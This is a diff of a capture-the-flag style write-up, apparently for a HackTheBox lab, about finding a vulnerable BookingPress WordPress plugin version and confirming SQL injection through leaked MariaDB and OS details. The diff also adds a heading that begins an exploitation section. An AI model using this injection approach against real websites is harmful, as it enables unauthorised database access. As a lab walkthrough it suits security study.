@@ -117,7 +117,7 @@ these are interesting but after checking they don't offer any vulnerabilities in
 
 i dont have a wpscan account, but we know of at least one plugin used (bookingpress), and it turns out that there is an SQL injection avaliable for a certain version, so lets check the version.
 
-Without having wpscan for this, i searched pages for links to http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking and came across many links that looked like '<link rel='stylesheet' id='bookingpress_fonts_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10' media='all' />'
+Without having wpscan for this, i searched pages for links to http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking and came across many links that looked like `<link rel='stylesheet' id='bookingpress_fonts_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10' media='all' />`
 
 ver=1.0.10 which is within the bounds of the vulnerability! < 10.0.11
 https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
@@ -149,4 +149,9 @@ Referrer-Policy: strict-origin-when-cross-origin
 [{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23 18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]% 
 ```
 
-SQL INJECTION!
+SQL INJECTION! We see `{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu"` 
+I've been looking at starting to look at hackerone recently, this would be the point where i would report this to the company.
+But i'm in the role of the threat now so on we go!
+
+## Exploitation
+
